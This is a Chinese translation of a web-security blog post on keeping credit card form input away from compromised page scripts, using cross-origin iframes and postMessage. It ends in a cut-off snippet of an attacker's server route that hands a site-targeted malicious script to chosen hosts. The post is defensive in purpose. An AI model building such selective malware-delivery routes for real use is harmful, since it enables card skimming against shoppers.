-&lt;p&gt;&lt;img src=&quot;https://cdn-images-1.medium.com/max/1000/1*5eUVNNY6lruo7pw4MxHqaw.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;不幸的是，因為我的網站的頁首，頁尾和導覽列都是React組件，所以我不能在這個非常陽春的頁面上使用它們。因此，您看到的“標題”是我完整標題的手動複製版，並沒有全部的常見功能。這只是一個藍色的矩形。&lt;/p&gt;
-
-&lt;p&gt;當用戶 填盡(in) 該表格（還是該說 填完(out) 該表單-為什麼對立的詞可以組出一樣的意思！？），他們會點擊提交，並重新轉址回到結賬流程的下一個步驟。這可能需要進行一些後端的修改，以比對用戶他們在跨頁面轉移時提交的數據。&lt;/p&gt;
-
-&lt;p&gt;為了保持這份文件的乾淨，我們應使用native form validation
-，而不是JavaScript -  &lt;a href=&quot;https://caniuse.com/#feat=form-validation&quot;&gt;現有97％使用率&lt;/a&gt;，想只靠&lt;code class=&quot;highlighter-rouge&quot;&gt;required&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;pattern&lt;/code&gt;兩個屬性讓我們通過一個完整的JavaScript驗證應該還有很長一段的路要走。&lt;/p&gt;
-
-&lt;p&gt;如果你想看實際運用，&lt;a href=&quot;https://codepen.io/davidgilbertson/pen/OzdEbL&quot;&gt;這裡有一份筆記&lt;/a&gt;，裡面有一些no-js
-正規表達式驗證和條件樣本。（預設的限制不多，但應該足夠表達用法了。）&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;我建議，如果你要這樣做，最好把它全部保存在一個文件中。&lt;/p&gt;
-
-&lt;p&gt;複雜是這部份最大的敵人（比以往任何時候都多）。上面例子中的HTML文件（加上&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;style&amp;gt;&lt;/code&gt;標籤中嵌入的CSS）約有100行; 由於它很小幾乎沒有網路請求，因此幾乎不可能受干擾而未被發現。&lt;/p&gt;
-
-&lt;p&gt;不幸的是，這種方法需要複製許多CSS。我後來想了很多，看了好幾種方法。他們只想要更多的程式碼，而防止重複程式碼的數量並不是他們的目標。&lt;/p&gt;
-
-&lt;p&gt;所以，我建議:儘管“不要重複已存程式碼”的口號是很好的目標，但不應該被視為必須不惜一切代價持之以恆的絕對原則。在一些像本篇描述的罕見情況下，重複的程式碼是兩個惡果中較小的一個。&lt;/p&gt;
-
-&lt;p&gt;最有用的規則是你知道什麼時候該打破它。&lt;/p&gt;
-
-&lt;p&gt;（我的新年的決心是嘗試讓事情聽起來更深刻，但實際上沒有說出任何實質內容。）&lt;/p&gt;
-
-&lt;h4 id=&quot;選項2在iframe中重擊選項1&quot;&gt;選項2：在iframe中重擊選項1&lt;/h4&gt;
-
-&lt;p&gt;選項1固然是好的，但是從UI和UX的角度來看，這明顯是一大退步，而是你想要讓別人付錢之旅程的最後一個摩擦地方。&lt;/p&gt;
-
-&lt;p&gt;選項2通過截取表單並塞進iframe中來提供服務以解決此問題。&lt;/p&gt;
-
-&lt;p&gt;你可能會試圖做下面這樣的事情：&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/credit-card-form.html&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;credit card form&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;460&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;400&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;frameBorder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;scrolling=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;先別做傻事。&lt;/p&gt;
-
-&lt;p&gt;在這個例子中，父頁面和iframe的內容仍然可以自由地查看和交換。這就像把一個杜賓犬留在一個房間裡，而倉鼠在另一個房間裡，在他們之間有一扇門。但當杜賓犬變得飢餓的時候，牠可以簡單地推開。&lt;/p&gt;
-
-&lt;p&gt;所以我們需要做的是“沙箱”，即iframe。可是（我最近才知道）這與iframe 的&lt;code class=&quot;highlighter-rouge&quot;&gt;sandbox&lt;/code&gt;屬性無關，因為這是用於保護iframe的父頁面。但我想從父頁面保護iframe的內容。&lt;/p&gt;
-
-&lt;p&gt;幸運的是，瀏覽器對來自不同來源的東西有著預設的不信任。這就是所謂的&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy&quot;&gt;同源政策&lt;/a&gt; [容我在這裡怒政治上嘴一波川普]。&lt;/p&gt;
-
-&lt;p&gt;正因為如此，只需從不同的網域加載frame就足以防止兩者之間的通訊。&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;iframe&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://different.domain.com/credit-card-form.html&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;credit card form&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;height=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;460&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;width=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;400&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;frameBorder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;scrolling=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;no&quot;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;如此就能實現動物方城市大和平共處了。&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;如果你想知道iframe中內容的可訪問性，這是個好問題，但你不用擔心。&lt;a href=&quot;https://webaim.org/techniques/frames/&quot;&gt;根據WebAIM的說法&lt;/a&gt;：“內聯框架沒有明顯的可訪問性問題。內聯框架的內容是依據它執行的位置（基於標記順序）讀取的，就好像它是父頁面中的內容一樣。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;讓我們考慮填充表單後會發生什麼。用戶將在iframe中的表單中點擊提交按鈕，並且我想要轉址到&lt;strong&gt;父&lt;/strong&gt;頁面。但是，如果他們有不同的來源，這有可能嗎？&lt;/p&gt;
-
-&lt;p&gt;Yup，這就是&lt;code class=&quot;highlighter-rouge&quot;&gt;target&lt;/code&gt;表單的屬性：&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/pay-for-the-thing&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;target=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_top&quot;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- form fields --&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;接下來他們還能怎樣？&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;因此，用戶可以將其敏感訊息輸入到與周圍頁面無縫接軌的表單中。然後當他們提交時，頂層頁面將被轉址以回應表單提交。&lt;/p&gt;
-
-&lt;p&gt;選項2是對安全性的一個巨大增強 - 我不再有一個落後的信用卡填寫型式。但是這仍然是在可用性上的退步。&lt;/p&gt;
-
-&lt;p&gt;理想的解決方案將不需要&lt;strong&gt;任何&lt;/strong&gt;完整的頁面重定向&lt;/p&gt;
-
-&lt;h4 id=&quot;選項3在框架和父頁面之間進行通訊&quot;&gt;選項3：在框架和父頁面之間進行通訊&lt;/h4&gt;
-
-&lt;p&gt;在我的示例網站中，我實際上希望保持信用卡數據的狀態，以及所購買產品的詳細訊息，並將所有訊息以一個AJAX的型式打包請求並提交。&lt;/p&gt;
-
-&lt;p&gt;這是非常容易的。我將使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;將數據從表單發送到父頁面。&lt;/p&gt;
-
-&lt;p&gt;這是在iframe中提供的頁面…&lt;/p&gt;
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    
-    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- form stuff in here --&amp;gt;&lt;/span&gt;
-    
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'form'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'submit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preventDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bananas'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;na&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-          &lt;span class=&quot;na&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ccname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-          &lt;span class=&quot;na&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cardnumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-          &lt;span class=&quot;na&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cvc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-          &lt;span class=&quot;na&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cc-exp'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
-      &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'https://mysite.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;還記得var嗎？&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;…以及在父頁面（或者更具體地說，在首先請求iframe的React組件）中，我只是監聽來自iframe的訊息並相應地更新狀態：&lt;/p&gt;
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;CreditCardFormWrapper&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PureComponent&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;componentDidMount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'message'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bananas'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-  &lt;span class=&quot;nx&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-      &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;iframe&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https://secure.mysite.com/credit-card-form.html&quot;&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;credit card form&quot;&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;460&quot;&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;400&quot;&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;frameBorder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;
-        &lt;span class=&quot;nx&quot;&gt;scrolling&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;no&quot;&lt;/span&gt;
-      &lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;這個舉例是針對React客製的，但這個概念不是&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;如果iframe覺得自己很活躍，那麼我可以將&lt;code class=&quot;highlighter-rouge&quot;&gt;onchange&lt;/code&gt;每個輸入的數據從表單發送到父項。&lt;/p&gt;
-
-&lt;p&gt;當iframe活躍時，沒有任何東西阻止父頁面進行驗證，並將有效性狀態發送回普通表單。這使我可以重新使用我的網站其他任何驗證邏輯。&lt;/p&gt;
-
-&lt;p&gt;[補充：根據在本篇評論中兩個&lt;a href=&quot;https://medium.com/@jimmybyrum/any-reason-not-to-do-form-validation-within-the-iframe-either-with-some-very-trustworthy-js-or-a1e7695f82b1&quot;&gt;留言者&lt;/a&gt;的建議，iFrame可以提交數據，而不轉址至父頁面，然後通訊成功/失敗的狀態使用&lt;code class=&quot;highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;返還給父頁面。這樣就沒有數據會被發送到父頁面。]&lt;/p&gt;
-
-&lt;p&gt;就是這樣！您的用戶敏感訊息可以安全地輸入到不同來源的iframe中，而不會被父頁面隱藏，但是獲取的數據仍然可以是應用程序狀態的一部分，這意味著使用者體驗不需要進行任何變動。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;現在，您可能會認為將信用卡數據上傳到主頁面是巨大的失敗。這不是可供任何惡意代碼訪問嗎？&lt;/p&gt;
-
-&lt;p&gt;這個答案有兩個部分，我想不出一個簡單的方法來解釋它。抱歉。&lt;/p&gt;
-
-&lt;p&gt;我認為這是一個合理的風險，從駭客的角度來看更容易理解。想像一下，你的工作是想出一些可以在&lt;strong&gt;任何&lt;/strong&gt;網站上運行的惡意代碼，尋找敏感訊息並將其發送到某個伺服器。每次你發送封包時，都會冒著被抓的危險。所以只發送你確定有價值的數據是最符合你的效益的。&lt;/p&gt;
-
-&lt;p&gt;如果當駭客是我的工作，我不會盲目傾聽&lt;code class=&quot;highlighter-rouge&quot;&gt;message&lt;/code&gt;事件並發送我在其中發現的數據。尤其不是當有千千萬萬個網站正有十分脆弱的信用卡表單與整齊地標記輸入等待被我攻擊的時候。&lt;/p&gt;
-
-&lt;p&gt;答案的第二部分是，如果您擔心的惡意代碼&lt;strong&gt;不&lt;/strong&gt;只是一些通用代碼，它可能&lt;strong&gt;知道&lt;/strong&gt;要在您的網站上收聽該&lt;code class=&quot;highlighter-rouge&quot;&gt;message&lt;/code&gt;事件，並將信用卡號碼取出。像這種完全針對您的網站專門編寫代碼的想法，那你被攻擊是他的努力應得的回報…&lt;/p&gt;
-
-&lt;h3 id=&quot;目標和通用的惡意代碼&quot;&gt;目標和通用的惡意代碼&lt;/h3&gt;
-
-&lt;p&gt;到目前為止我已經描述了使用&lt;strong&gt;通用&lt;/strong&gt;惡意代碼的攻擊 也就是說，代碼不知道它運行的是什麼網站，它只是尋找，收集和發送敏感訊息給惡龍在火山地下室的邪惡巢穴。&lt;/p&gt;
-
-&lt;p&gt;另一方面，&lt;strong&gt;有針對性的&lt;/strong&gt;惡意代碼是與&lt;strong&gt;您的&lt;/strong&gt;網站專門針對而寫的代碼。它是由一個熟練的開發人員花了幾個星期完全熟悉你的DOM的每一個角落而集結成的結晶。&lt;/p&gt;
-
-&lt;p&gt;如果您的網站受到了有&lt;strong&gt;針對性的&lt;/strong&gt;惡意代碼的攻擊，那就爆了。這情況沒有第二種可能。一定是你已經把所有東西都放在一個非常安全的iframe中，但是惡意代碼只會刪除iframe並用假表單替換它。攻擊者甚至可以更改網站上顯示的價格，可能會提供50％的折扣，並告訴用戶如果他們需要貨物，他們需要重新輸入信用卡詳細信息。這種非戰之罪也只好認了。&lt;/p&gt;
-
-&lt;p&gt;如果您的網站上有針對性的惡意代碼，那麼您最好還是彎下腰來撿朵鮮花聞一聞然後放鬆。你知道的，比起這些問題我們更應該專注於生活中的正面積極的東西。&lt;/p&gt;
-
-&lt;p&gt;這就是為什麼擁有&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP&quot;&gt;內容安全策略&lt;/a&gt;非常重要。否則，攻擊者可以通過向邪惡的伺服器發送請求來大規模散布可升級到&lt;strong&gt;有針對性的&lt;/strong&gt;代碼的&lt;strong&gt;通用&lt;/strong&gt;惡意代碼（比如通過一個npm包）。&lt;/p&gt;
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/analytics.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;includes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'acme-sneakers.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sendFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'../malicious-code/targeted/acme-sneakers.js'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;includes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'corporate-bank.com'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
